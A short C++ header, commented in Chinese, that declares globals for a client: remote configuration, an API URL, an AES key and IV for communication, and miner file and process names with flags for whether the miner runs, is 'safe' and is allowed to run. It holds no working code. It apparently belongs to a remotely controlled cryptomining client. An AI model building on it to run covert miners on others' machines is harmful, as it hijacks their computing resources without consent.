#pragma once
#include "lib/json.h"

using json = nlohmann::json;
using namespace std;

// 客户端信息
extern json G_PC;

// 远程配置
extern json G_CONFIG;
extern string G_CONFIG_FILE; // 配置文件名

// 接口信息
extern string G_API_VER;
extern string G_API_URL;

// 通信秘钥
extern string G_AES_KEY;
extern string G_AES_IV;

extern string G_MINER_FILER; // 矿工文件名
extern string G_MINER_EXE; // 矿工进程名
extern bool G_MINER_RUN; // 矿工是否运行
extern bool G_MINER_SAFE; // 矿工是否安全
extern bool G_MINER_STATE; // 矿工是否允许运行
